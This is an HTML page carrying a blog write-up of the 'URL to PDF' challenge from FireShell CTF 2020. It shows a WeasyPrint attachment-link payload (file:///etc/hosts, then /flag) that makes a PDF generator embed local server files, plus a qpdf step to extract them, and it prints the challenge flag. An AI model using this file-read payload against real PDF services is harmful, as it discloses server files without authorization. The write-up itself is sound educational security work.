@@ -1,0 +1,228 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@1.207/distr/fira_code.css">
+
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro|Source+Sans+Pro:300,400,400i,700" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="/theme/stylesheet/style.min.css">
+
+  <link rel="stylesheet" type="text/css" href="/theme/pygments/rrt.min.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="/theme/font-awesome/css/solid.css">
+
+
+    <link href="/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="securitytaters Atom">
+
+
+
+
+
+<meta name="author" content="0xm4v3rick" />
+<meta name="description" content="Challenge based on the talk Owning the clout through SSRF and PDF generators." />
+<meta name="keywords" content="webappsec, PDF generators, file read, writeup">
+
+
+<meta property="og:site_name" content="securitytaters"/>
+<meta property="og:title" content="Solving URL to PDF from FireShell CTF 2020"/>
+<meta property="og:description" content="Challenge based on the talk Owning the clout through SSRF and PDF generators."/>
+<meta property="og:locale" content="en_US"/>
+<meta property="og:url" content="/solving-url-to-pdf-from-fireshell-ctf-2020.html"/>
+<meta property="og:type" content="article"/>
+<meta property="article:published_time" content="2020-03-23 09:00:00+05:30"/>
+<meta property="article:modified_time" content=""/>
+<meta property="article:author" content="/author/0xm4v3rick.html">
+<meta property="article:section" content="CTF"/>
+<meta property="article:tag" content="webappsec"/>
+<meta property="article:tag" content="PDF generators"/>
+<meta property="article:tag" content="file read"/>
+<meta property="article:tag" content="writeup"/>
+<meta property="og:image" content="">
+
+  <title>securitytaters &ndash; Solving URL to PDF from FireShell CTF 2020</title>
+
+</head>
+<body>
+  <aside>
+    <div id='blah'>
+
+<h1><a style="font-weight:bold;font-size:xx-large" href="https://securitytaters.info">securitytaters</a></h1>
+<hr>
+    </div>
+
+    <div style="margin-top: -90px;">
+      <h1><a href=""></a></h1>
+
+
+      <nav>
+        <ul class="list">
+
+	<h2>0xm4v3rick</h2>
+            <li><a target="_blank" href="https://twitter.com/0xm4v3rick" >Twitter</a></li>
+            <li><a target="_blank" href="https://github.com/0xm4v3rick" >Github</a></li>
+
+	<h2>0xshrimantyogi</h2>
+            <li><a target="_blank" href="https://twitter.com/0xshrimantyogi" >Twitter</a></li>
+            <li><a target="_blank" href="https://github.com/0xshrimantyogi" >Github</a></li>
+
+        </ul>
+      </nav>
+
+      <ul class="social">
+          <li>
+            <a  class="sc-Git" href="#" target="_blank">
+            <i class="fab fa-Git">
+            </i>
+
+          </a></li>
+          <li>
+            <a  class="sc-Another social link" href="#" target="_blank">
+            <i class="fab fa-Another social link">
+            </i>
+
+          </a></li>
+      </ul>
+ 					<h2><a href="/archives.html">Archives</a></h2> <br/>
+					<h2><a href="/authors.html">Authors</a></h2>
+</br>
+<h3 style="color: #00ff28;"><b>This site uses Fira Code so the code will not appear as usual but it will work if you copy and use it directly.</b></h3>
+    </div>
+
+
+  </aside>
+  <main>
+
+
+<article class="single">
+  <header>
+      
+    <h1 id="solving-url-to-pdf-from-fireshell-ctf-2020">Solving URL to PDF from FireShell CTF 2020</h1>
+    <p>
+          Posted on Mon 23 March 2020 in <a href="/category/ctf.html">CTF</a>
+
+by <a href="0xm4v3rick.html">0xm4v3rick</a>
+    </p>
+  </header>
+<hr>
+
+  <div>
+    <p>The <strong>URL to PDF</strong> from <strong>FireShell CTF 2020</strong> challenge note:</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Please</span> <span class="n">test</span> <span class="n">our</span> <span class="n">brand</span> <span class="k">new</span> <span class="n">service</span><span class="p">.</span>
+
+<span class="n">flag</span> <span class="k">is</span> <span class="k">on</span> <span class="o">/</span><span class="n">flag</span>
+
+<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">urltopdf</span><span class="p">.</span><span class="n">fireshellsecurity</span><span class="p">.</span><span class="n">team</span><span class="o">/</span>
+</pre></div>
+</td></tr></table>
+
+<p>Accessing the URL sends us to a website which converts the page at a given URL to PDF. Immediately a talk related to this comes to mind. <strong>Owning the clout through SSRF and PDF generators</strong> which highlights issues in PDF generation when inputs are not properly validated when generating PDF primarily allowing SSRF or local file read among other things.</p>
+<p>So let's identify the PDF generator as mentioned in the talk. I am using requestbin here as usual to log requests and analyze it.  </p>
+<p><img alt="converter" src="img/8.1.jpg" /></p>
+<p>We see that the user agent is mentioned as <strong>WeasyPrint 51 (http://weasyprint.org/)</strong>   </p>
+<p><img alt="UA" src="img/8.2.jpg" /></p>
+<p>Now we need to prepare a HTML page which can be provided for PDF conversion via a URL. As mentioned in the talk we will need to use <strong>&lt;link rel=attachment href="file:///etc/passwd"></strong> payload as part of the HTML page. I used <strong>/etc/hosts</strong> instead of usual passwd file. HTML page was as follows. I hosted it using <a href="https://filebin.net/">filebin</a> and provide the URL for PDF generator.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">attachment</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;file:///etc/hosts&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+</td></tr></table>
+
+<p>After downloading the PDF I needed to decode the data from PDF to readable format. Retrieving the contents was something I had to search since results are not displayed directly in the PDF but are hidden inside <strong>FlateDecode</strong> part of the PDF. The utility mentioned in the talk was not available on the internet or I couldn't find it. After searching around for a while I found a linux utility called qpdf which I used as follows.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">qpdf --qdf --object-streams=disable 1f51f044e0ca6c90d995ab9b4e2bd23c.pdf out.pdf</span>
+</pre></div>
+</td></tr></table>
+
+<p>Reading the output pdf in text editor gave me the contents of the <strong>/etc/hosts</strong> as shown.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">&gt;&gt;</span>
+<span class="err">stream</span>
+<span class="err"># Kubernetes-managed hosts file.</span>
+<span class="err">127.0.0.1       localhost</span>
+<span class="err">::1     localhost ip6-localhost ip6-loopback</span>
+<span class="c">fe00::0 ip6-localnet</span>
+<span class="c">fe00::0 ip6-mcastprefix</span>
+<span class="c">fe00::1 ip6-allnodes</span>
+<span class="c">fe00::2 ip6-allrouters</span>
+<span class="err">10.244.0.22     url-to-pdf-8f9ddf549-prfvm</span>
+<span class="err">endstream</span>
+<span class="err">endobj</span>
+</pre></div>
+</td></tr></table>
+
+<p>Now replacing the <strong>/etc/hosts</strong> with <strong>/flag</strong> as mentioned in the challenge note gave me the flag.</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="err">&gt;&gt;</span>
+<span class="err">stream</span>
+<span class="err">F#{th4nk5_t0_Ben_Sadeghipour_&amp;_Cody_Brocious}</span>
+<span class="err">endstream</span>
+<span class="err">endobj</span>
+</pre></div>
+</td></tr></table>
+
+<p>Thanks for reading. Feel free to contact me on twitter for any queries or feedback. Cheers!!!</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="/tag/webappsec.html">webappsec</a>
+      <a href="/tag/pdf-generators.html">PDF generators</a>
+      <a href="/tag/file-read.html">file read</a>
+      <a href="/tag/writeup.html">writeup</a>
+    </p>
+  </div>
+
+
+
+
+
+</article>
+
+    <footer>
+<p>&copy;  </p>
+<p>    Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+
+<br> &copy; Copyright 2020, securitytaters.info
+</p>    </footer>
+  </main>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " securitytaters ",
+  "url" : "",
+  "image": "",
+  "description": ""
+}
+</script>
+
+</body>
+</html>
